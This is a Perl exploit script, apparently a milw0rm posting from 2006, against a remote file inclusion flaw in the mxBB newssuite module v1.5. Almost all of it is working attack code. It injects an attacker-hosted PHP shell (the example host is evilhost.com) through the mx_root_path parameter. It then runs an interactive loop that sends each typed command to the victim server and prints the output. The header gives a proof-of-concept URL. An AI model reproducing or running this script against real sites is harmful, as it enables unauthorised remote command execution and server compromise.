#!/usr/bin/perl
#mxBB newssuite Module v1.5  --Remote File Inclusion Exploit
#Bug Found & Exploit [c]oded By Dr Max Virus
#Download:http://www.mx-system.com/modules/mx_pafiledb/dload.php?action=download&file_id=17

#PoC: http://[target]/mxBB/modules/mx_newssuite/includes/newssuite_constants.php?mx_root_path=[shell]


use LWP::UserAgent;

$target=@ARGV[0];
$shellsite=@ARGV[1];
$cmdv=@ARGV[2];

if($target!~/http:\/\// || $shellsite!~/http:\/\// || !$cmdv)
{
	usg()
}
header();


while()
{
print "[Shell] \$";
while (<STDIN>)
{
	$cmd=$_;
	chomp($cmd);
	
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET=>$target.'/includes/newssuite_constants.php?mx_root_path='.$shellsite='.?&'.$cmdv.'='.$cmd)or die "\n\n Failed to Connect, Try again!\n";  
$res = $xpl->request($req);
$info = $res->content;
$info =~ tr/[\n]/[&#234;]/;

 
if (!$cmd) {
print "\nEnter a Command\n\n"; $info ="";
}


elsif ($info =~/failed to open stream: HTTP request failed!/ || $info =~/: Cannot execute a blank command in <b>/)
{
print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";
exit;
}


elsif ($info =~/^<br.\/>.<b>Warning/) {
print "\nInvalid Command\n\n";
};


if($info =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{
$final = $1;
$final=~ tr/[&#234;]/[\n]/;
print "\n$final\n";
last;
}

else {
print "[shell] \$";
} 
}
}
last;



sub header()
{
print q{
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
mxBB newssuite Module v1.5  -- Remote File  Include Exploit
      
Vulnerablity found by: Dr Max Virus
      
Exploit [c]oded by: Dr Max Virus        
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
}
}
sub usg()
{
header();
print q{
Usage:  exploit.pl <fullpath> <Shell Location> <Shell Cmd>
<FULL PATH> - Path to site exp. www.site.com
<shell Location> - Path to shell exp. www.evilhost.com/shell.txt
<shell Cmd Variable> - Command variable for php shell exp. id
Example:  exploit.pl http://www.site.com/[path]/
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
};

exit();
}

# milw0rm.com [2006-12-12]
